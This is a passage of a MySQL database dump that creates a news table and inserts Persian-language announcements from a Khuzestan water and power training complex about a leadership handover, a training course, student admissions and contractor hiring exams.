-- =============================================
-- MySQL/WordPress Compatible Database Script
-- Table: kw_news (converted from SQL Server Kw_News)
-- Complete News Data with Full Content (Summary + Content + Images)
-- =============================================

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

-- --------------------------------------------------------

--
-- Table structure for table kw_news
--

DROP TABLE IF EXISTS kw_news;
CREATE TABLE kw_news (
  id int(11) NOT NULL AUTO_INCREMENT,
  group_id int(11) NOT NULL DEFAULT 1,
  sender_id varchar(36) NOT NULL,
  subject varchar(500) NOT NULL,
  summary text NOT NULL,
  content longtext NOT NULL,
  image_url varchar(256) DEFAULT NULL,
  hits int(11) NOT NULL DEFAULT 0,
  news_date varchar(50) NOT NULL,
  news_time varchar(50) NOT NULL,
  year int(11) NOT NULL,
  month varchar(50) NOT NULL,
  num_month int(11) NOT NULL,
  day int(11) NOT NULL,
  created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  status varchar(20) NOT NULL DEFAULT 'published',
  PRIMARY KEY (id),
  KEY idx_group (group_id),
  KEY idx_date (news_date),
  KEY idx_year_month (year, num_month),
  KEY idx_hits (hits),
  KEY idx_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table kw_news with full content
--

ALTER TABLE kw_news AUTO_INCREMENT = 1;

INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (49191, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'تودیع و معارفه سرپرست مجتمع', '<p dir="RTL">
	مراسم تکریم و معارفه سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد.</p>
', '<p dir="RTL" style="text-align: justify;">
	&nbsp;به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان: مراسم تکریم و معارفه رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان با حضور مدیر و رئیس دفتر بازرسی مجامع سازمان آب و برق خوزستان و همچنین جمعی از معاونین مدیران و پرسنل مجتمع آموزشی برگزار شد.</p>
<p dir="RTL" style="text-align: justify;">
	طی این مراسم مهندس محسن انصاری به عنوان سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان منصوب و از زحمات&nbsp; دکتر نرگس ظهرابی تقدیر به عمل آمد.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;مهندس رئیسی مدیر دفتر بازرسی و مجامع سازمان آب و برق خوزستان در این مراسم ضمن قدردانی از تلاش های دلسوزانه دکتر نرگس ظهرابی طی دو سال تصدی ریاست مجتمع گفت:</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;به حمدالله ظرفیت بسیار خوبی در زمینه آموزش و پژوهش در مجتمع آموزشی خوزستان به وجود آمده که این را مدیون تلاش های دکتر ظهرابی و مجموعه همکاران این مجتمع هستیم.</p>
<p dir="RTL" style="text-align: justify;">
	جایگاه مناسبی را در سطح آموزش وزارت نیرو در استان و حتی در کشور احراز کرده ایم، مهندس رئیسی در ادامه به روشن بودن مسیر و اهداف پیش رو اشاره کرد و افزود:</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;بر اساس ریل گذاری های صورت گرفته و همچنین حمایت مجموعه دفتر مدیریت بازرسی و مجامع، تلاش، پشتکار و البته انگیزه&zwnj;ای دوچندان می طلبد تا به امید خدا بتوانیم قطب آموزشی - پژوهشی صنعت آب و برق استان و سپس کشور باشیم.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;دکتر نرگس ظهرابی رئیس سابق مجتمع آموزشی نیز ضمن قدردانی از زحمات و مجدانه پرسنل گفت:</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;طی این مدت دو سال&nbsp; که در مجتمع آموزشی توفیق خدمت داشتم به لطف خدا و همت همکاران توانستیم به دستاوردهای ارزشمندی در زمینه های آموزشی و پژوهشی دست یابیم.</p>
<p dir="RTL" style="text-align: justify;">
	دکتر ظهرابی به نمودار رو به رشد عملکرد دو ساله اشاره کرد و افزود:</p>
<p dir="RTL" style="text-align: justify;">
	این مهم را مدیون همت بلند و دلسوزانه شما همکاران هستم. دکتر ظهرابی در پایان برای ریاست جدید مجتمع آموزشی و دیگر همکاران&nbsp; آرزوی توفیق کرد. وی در ادامه این نکته را مهم برشمرد که ادامه همین مسیر رو به رشد مرهون همدلی و پشتکار و البته تمرکز به متن و فاصله گرفتن از هر گونه حاشیه احتمالی است.</p>
<p dir="RTL" style="text-align: justify;">
	مهندس محسن انصاری سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان ضمن&nbsp; تبریک ایام الله دهه مبارک فجر و چهل و سومین سال پیروزی شکوهمند انقلاب اسلامی و تبریک و تهنیت به مناسبت ۱۳ رجب، میلاد امام اول شیعیان حضرت علي(ع) و روز پدر، از&nbsp; زحمات دکتر ظهرابی قدردانی کرد و افزود:</p>
<p dir="RTL" style="text-align: justify;">
	جا دارد قبل از هر چيز تشکري داشته باشم از حسن اعتمادي که به اين حقير شده است، خصوصاً از مديريت مجموعه محترم سازمان آب و برق خوزستان، دکتر ایزد جو، دکتر خدابخشی، مهندس رئیسی و مهندس عچرش، همچنین رياست محترم آموزشهای تخصصی و صالحيت حرفه اي صنعت آب و برق جناب آقاي دکتر فدائي تهرانی و معاون محترم تحقیقات و منابع انسانی وزیر نیرو و رياست محترم هيات امنا جناب آقاي دکتر انجم شعاع که با ابلاغ اين حکم، توفيق خدمتگزاري به نظام مقدس جمهوري اسلامي در اين مجتمع را براي بنده فراهم نمودند. ضمنا جا دارد از حضور همه همکاران عزيز و سروران ارجمندي که زحمت کشيدند و در اين جلسه حضور بهم رساندند، صميمانه سپاسگزاری کنم.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در رابطه با زحمات و خدمات دکتر ظهرابی عنوان کرد:</p>
<p dir="RTL" style="text-align: justify;">
	زمان تصدی ایشان به واقع نقطه عطفی در تمام دوران مجتمع آموزشی است.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;ایشان با اشاره به تهیه سند راهبردی پنج ساله که اخیراً تدوین شده، افزود در این سند مسیر مشخص، اهداف و برنامه ها و راهکارها نیز تعیین شده است هم اکنون نیاز به همت مجدانه و تلاش دلسوزانه مجموعه معاونین مدیران و همکاران مجتمع داریم.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;مهندس انصاری عنوان داشت:</p>
<p dir="RTL" style="text-align: justify;">
	جهت رسیدن به این مهم نکاتی را برای خودم اصل می دانم که عبارتند از:</p>
<p dir="RTL" style="text-align: justify;">
	- در انجام امور معتقد به علم محوری، برنامه محوری، کارشناس محوری، اخلاق محوری و انضباط محوری هستم.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;- تمرکز مطلق بر انجام صرف وظیفه کاری و دوری از مسائل حاشیه&zwnj;ای و سیاسی کاری</p>
<p dir="RTL" style="text-align: justify;">
	- داشتن، تعامل سازنده با شرکت ها و البته&nbsp; اصل مشورت در تمام امور را مد نظر خواهم داشت.</p>
<p dir="RTL" style="text-align: justify;">
	- مخالف حذف یا نادیده گرفتن تصمیمات، سیاستها و اقدامات خوب گذشته خواهم بود و معیشت کارکنان از جمله مسائل حائز اهمیت برای اینجانب هستند.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;مهندس انصاری گفت:</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;طی ۲۰ سال سابقه خدمت در این مجتمع با چالش های بسیاری مواجه بوده ایم اما به لطف خدا علیرغم هرگونه فراز و فرود توانستیم از آنها عبور کنیم.</p>
<p dir="RTL" style="text-align: justify;">
	مهندس انصاری در خصوص عملکرد دو سال اخیر اینگونه عنوان کرد:</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;درصد رشد عملکرد آموزشی در سال ۹۹ نسبت به ۹۸،&nbsp; در حدود ۶۱ درصد و از در ۹ ماهه ۱۴۰۰ نسبت به ۹ ماهه ۹۹، حدود ۴۰ درصد بوده است.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp; امیدوارم با همت و همراهی همه همکاران بتوانیم این وضعیت رو به رشد رو تحکیم ببخشیم و علاوه بر آن نیز شاهد رشد عملکرد بهتر و رضایتمندی بیشتر شرکتهای طرف قرارداد و هیات امنای محترم باشیم .</p>
<p style="text-align: justify;">
	<span dir="RTL">&nbsp;در پایان جلسه مهندس عچرش رئیس دفتر بازرسی و مجامع سازمان آب و برق خوزستان ضمن قدردانی از دکتر نرگس ظهرابی و اهدای لوح تقدیر به ایشان، حکم انتصاب محسن انصاری را به وی اعطا کرد.</span></p>
', '49191mansaris.jpg', 2521, '1400/11/26', '4:34:35 PM', 1400, 'بهمن', 11, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (50184, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری دوره آموزشی شناخت صلاحیت حرفه ای', '<p dir="RTL" style="text-align: justify;">
	دوره آموزشی &quot;شناخت صلاحیت حرفه ای&quot; به میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	دوره آموزشی &quot;شناخت صلاحیت حرفه ای نیروی انسانی و چشم انداز آن در صنعت آب و برق&quot; به میزبانی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در روز یکشنبه مورخ 18 اردیبهشت 1401 در محل سالن همایش بوستان شهرستان اهواز برگزار شد.</p>
<p dir="RTL" style="text-align: justify;">
	در ابتدای جلسه که با حضور نمایندگانی از کلیه شرکت های صنعت آب و برق استان خوزستان و برخی شرکت های آب و برق سایر استان ها از قبیل شرکت مادرتخصصی مهندسی آب و فاضلاب کشور، شرکت های توزیع نیروی برق استان های خراسان رضوی، بوشهر، یزد و لرستان و همچنین شرکت های آب منطقه ای فارس و همدان به صورت حضوری و مجازی برخط و همزمان برگزار گردید، مهندس محسن انصاری سرپرست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان ضمن خیر مقدم به مدعوین، ابراز خرسندی کرد و افزود: برگزاری دوره آموزشی به صورت حضوری را پس از دو سال محدودیت بیماری کرونا به فال نیک می&zwnj;گیریم و فرصت دیدار همکاران را غنیمت می&zwnj;شماریم. مهندس انصاری ضمن تشکر و قدردانی از زحمات و همکاری آقای دکتر مهدی مقسمی رئیس گروه آموزش سازمان آب و برق خوزستان در برگزاری این دوره اذعان داشت: در دوران بیماری کرونا ضرورت ایجاد و به روزرسانی بستر آموزش های مجازی بیش از پیش احساس شد که به لطف خدا و با تلاش شبانه&zwnj;روزی و مجدانه پرسنل مجتمع خوزستان توانستیم به استانداردهای مورد نظر در این حوزه دست یابیم. در ادامه ایشان افزود با عنایت به صدور بخشنامه ابلاغی معاونت محترم تحقیقات و منابع انسانی وزارت نیرو در خصوص آموزش و صلاحیت حرفه ای نیروی انسانی شرکت های پیمانکار صنعت آب و برق بر آن شدیم که تکلیف یاد شده را به عنوان اولین مرکز در کشور برگزار نماییم.</p>
<p dir="RTL" style="text-align: justify;">
	سپس دکتر محمدرضا فدائی تهرانی رییس مرکز آموزش های تخصصی و صلاحیت حرفه&zwnj;ای صنعت آب و برق با اشاره به اهمیت اجرای این طرح گفت: رویکردی که از سنوات گذشته مورد تحقیق و بررسی قرار گرفته از ابتدای سال جاری وارد مرحله اجرا شده است. ایشان افزود نیروهای شاغل در وزارت نیرو می بایست استانداردهای حرفه&zwnj;های مورد نظر در تصدی هر شغل را جهت توانمندسازی در حوزه کاری خود احراز کرده و گواهینامه مورد تایید وزارتخانه را کسب نمایند. وی در ادامه از لزوم اجرای این طرح سخن گفت و اضافه کرد: مرکز صلاحیت حرفه&zwnj;ای در نظر دارد تا نیروهای پیمانکاری به کارگیری شده در امور فنی در گام نخست آموزش دیده و سپس توسط افراد و کمیته های مجرب در خصوص تشخیص صلاحیت حرفه&zwnj;ای پایش و پس از آن به کارگیری شوند. ایشان ضمن تاکید بر این نکته که هدف حذف هیچکدام از نیروهای پیمانکاری موجود نیست، افزود: غایت و انگیزه اجرای این طرح صرفاً ارتقاء سطح کیفی و شغلی کارکنان است.</p>
<p dir="RTL" style="text-align: justify;">
	دکتر عماد ملکی نیا معاون مرکز آموزش های تخصصی و صلاحیت حرفه ای صنعت آب و برق که به عنوان مدرس دوره نیز دعوت شده بودند، ضمن تشکر از میزبانی و رضایتمندی از نحوه برگزاری گفت: موضوع آموزش از موارد بسیار حائز اهمیت در وزارت نیرو است که در نهایت منتج به توانمندسازی نیروی انسانی می گردد. وی در ادامه به موضوعاتی حول محور شناخت صلاحیت حرفه ای نیروی انسانی و استانداردهای تعریف شده در قالب بخشنامه های وزارت نیرو پرداخت.</p>
<p dir="RTL" style="text-align: justify;">
	پس از برگزاری دوره آموزشی جلسه پرسش و پاسخ جهت تبیین و شفاف سازی موضوع&nbsp; و رفع ابهام های احتمالی برگزار گردید.</p>
<p>
	&nbsp;</p>
<table border="0" cellpadding="1" cellspacing="1" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_1.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_2.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_3.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_4.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_5.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_6.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_7.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_8.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_9.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_10.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_11.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_12.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_13.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_14.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_15.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_16.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '49192Sm.jpg', 670, '1401/2/20', '11:49:58 AM', 1401, 'اردیبهشت', 2, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (50185, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برای مهر ماه سال 1401 بدون کنکور دانشجو می پذیرد.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهر ماه سال 1401 با 36ظرفیت&nbsp; رشته تحصیلی در <strong>مقاطع کاردانی و کارشناسی،</strong> <strong>بدون کنکور</strong> دانشجو می پذیرد. علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های 06133340070 و 09378535157 تماس حاصل نموده یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; رو به روی هتل نیشکر مراجعه نمایند.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_17.jpeg" /></p>
', '50185sabtname.jpg', 1107, '1401/3/29', '3:07:55 PM', 1401, 'خرداد', 3, '29');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51185, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آزمون استخدامی', '<p>
	<strong><span dir="RTL">شرکت ( به خدمات وفا منطقه دشت آزادگان ) به منظور تأمين نيروي انساني، اقدام به جذب نیرو می نماید</span></strong></p>
', '<p dir="RTL">
	<strong>به اطلاع ميرساند شرکت پیمانکاری بهره برداری (( به خدمات وفا منطقه دشت آزادگان )) به منظور تأمين نيروي انساني مورد نياز، تعداد 7 نفر از آقايان واجد شرايط را از طريق آزمون توانمنديهاي تخصصي(كتبي) و آزمون دانش مهارت (مصاحبه) به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرار داد نیروی حجمی جذب می نماید.</strong></p>
<p dir="RTL">
	<strong>در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید</strong><strong><span dir="LTR">.</span></strong></p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://kwphc.ir/Archive/Other/DaftarCheh.pdf" target="_blank"><span style="font-size:16px;"><strong>دریافت دفترچه آزمون</strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://estekhdam.kwphc.ir/azmoon140105" target="_blank"><span style="font-size:18px;"><strong>لینک ثبت نام</strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_18.jpeg" /></p>
', '50186Estekhdam.jpg', 24554, '1401/5/21', '10:14:12 AM', 1401, 'مرداد', 5, '21');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51186, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'بازگشایی ثبت نام و پذیرش دانشجو جهت مهرماه ۱۴۰۱', '<p>
	<span dir="RTL">مرکز علمی کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهر ماه سال </span><span dir="RTL">۱۴۰۱</span> <span dir="RTL">در </span><span dir="RTL">۳۶</span> <span dir="RTL">عنوان رشته تحصیلی دانشجو می پذیرد.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	مرکز علمی کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهر ماه سال ۱۴۰۱ در ۳۶ عنوان رشته تحصیلی در مقاطع کاردانی (۲۱ رشته) و کارشناسی ناپیوسته (۱۵ رشته)، از تاریخ ۱ لغایت ۴ شهریور بدون کنکور دانشجو می پذیرد.</p>
<p dir="RTL" style="text-align: justify;">
	علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های 06133340070 و 09378535157 تماس حاصل نموده یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; روبروی هتل نیشکر مراجعه نمایند.</p>
<p dir="RTL" style="text-align: justify;">
	جهت ثبت نام می توانید از طریق سامانه سازمان سنجش آموزش کشور يا بصورت حضوري اقدام گردد.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://www.sanjesh.org/group.aspx?gid=5" target="_blank"><span style="font-size:16px;">لینک ثبت نام با استفاده از سامانه</span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<span style="font-size:16px;"><span style="color:#ff66ff;"><strong>دریافت </strong></span><a href="https://www.uast.ac.ir/file/download/page/1660452628-note-jamekardani-v1.pdf"><span style="color:#ff66ff;"><strong>دفترچه راهنمای دوره کاردانی فنی و دوره کاردانی حرفه ای ناپیوسته نظام آموزش مهارتی مهرماه سال 1401</strong></span></a></span></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<span style="font-size:16px;"><span style="color:#2980b9;"><strong><span style="font-size:16px;"><strong><span style="color:#16a085;"><span style="font-size:16px;">دریافت </span></span><a href="https://www.uast.ac.ir/file/download/page/1660452970-notekarshenasi-jame-v1-1401.pdf"><span style="color:#16a085;"><span style="font-size:16px;">دفترچه راهنمای دوره مهندسی فناوری و دوره کارشناسی حرفه ای ناپیوسته نظام آموزش مهارتی مهرماه سال 1401</span></span></a></strong></span></strong></span></span></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_19.jpeg" /></p>
<p>
	&nbsp;</p>
', '51186TamdidPic.jpg', 1234, '1401/5/30', '3:57:28 PM', 1401, 'مرداد', 5, '30');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51187, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي جذب نيروی کار در قالب قرارداد نیروی حجمی', '<p dir="RTL">
	شرکت پیمانکاری تلاشگران آروین آپادانا به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت پیمانکاری تلاشگران آروین آپادانا از شرکتهای طرف قرارداد شرکت توزیع نیروی برق استان کهگیلویه و بویراحمد به منظور تأمين نيروي انساني مورد نياز، تعداد 16 نفر (تعداد 7 نفر به عنوان مامور قرائت کنتور و 9 نفر به عنوان راننده پایه یکم) از آقايان واجد شرايط را از طريق آزمون توانمنديهاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب می نماید</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140106/" target="_blank"><span style="font-size:20px;"><span style="color:#000080;"><strong>لینک ثبت نام</strong></span></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_20.jpeg" /></p>
<p>
	&nbsp;</p>
', '51187NP.jpg', 1855, '1401/5/30', '4:49:24 PM', 1401, 'مرداد', 5, '30');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51188, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اطلاعیه مهم آزمون استخدامی', '<p>
	<span dir="RTL">قابل توجه داوطلبان رشته برق (کاردانی و کارشناسی) آزمون جذب نیروی حجمی <span dir="RTL">شرکت به خدمات وفا منطقه دشت آزادگان</span> مورخ</span> <span dir="RTL">10 شهریور 1401</span></p>
', '<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<strong>قابل توجه داوطلبان رشته برق (کاردانی و کارشناسی) آزمون جذب نیروی حجمی مورخ 10 شهریور 1401</strong></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL">
	به اطلاع می رساند نظر به درخواست های مکرر متقاضیان جدید جهت ثبت نام و شرکت در این آزمون و محدودیت هایی در این خصوص، شرایط ثبت نام در آزمون به شرح ذیل اصلاح گردید:</p>
<p dir="RTL">
	۱) افزایش حداکثر سن شرکت کنندگان</p>
<p dir="RTL">
	۲) لغو معافیت پزشکی</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	جهت اطلاعات بیشتر آگهی آزمون مجددا دریافت و مطالعه گردد.</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	&nbsp;لذا مهلت ثبت نام و همچنین ویرایش اطلاعات تا <strong>ساعت 20 چهارشنبه مورخ 9 شهریور 1401</strong> تمدید گردید.</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Archive/Other/DaftarCheh.pdf" target="_blank"><span style="font-size:16px;">دریافت دفترچه آزمون</span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140105" target="_blank"><span style="font-size:16px;">لینک ثبت نام</span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_21.jpeg" /></p>
<p>
	&nbsp;</p>
', '51188ImpAdv.jpg', 1008, '1401/6/8', '3:14:26 PM', 1401, 'شهریور', 6, '8');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51189, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتایج آزمون', '<p dir="RTL">
	اعلام نتایج آزمون کتبي جذب نيروي حجمي مورخ 10 شهریور شرکت به خدمات وفا منطقه دشت آزادگان</p>
<p>
	&nbsp;</p>
', '<p dir="RTL">
	داوطلبین محترم آزمون کتبي جذب نيروي حجمي مورخ 10 شهریور شرکت به خدمات وفا منطقه دشت آزادگان می توانند جهت اطلاع از نتایج آزمون از لینک ذیل مراجعه نمایند.</p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<strong><a href="https://estekhdam.kwphc.ir/azmoon140105" target="_blank"><span style="color:#a52a2a;"><span style="font-size:18px;">اعلام نتایج آزمون</span></span></a></strong></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<strong><a href="https://kwphc.ir/Archive/Other/Result610.pdf" target="_blank"><span style="color:#008000;"><span style="font-size:16px;">دریافت اطلاعیه</span></span></a></strong></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_22.jpeg" /></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p>
	&nbsp;</p>
', '51189PicResult.jpg', 2591, '1401/6/17', '4:35:25 PM', 1401, 'شهریور', 6, '17');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (51190, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'تمدید زمان ثبت نام', '<p dir="RTL">
	قابل توجه داوطلبان آزمون جذب نیروی حجمی شرکت پیمانکاری تلاشگران آروین آپادانا مورخ 31 شهریور 1401</p>
<p>
	&nbsp;</p>
', '<p dir="RTL">
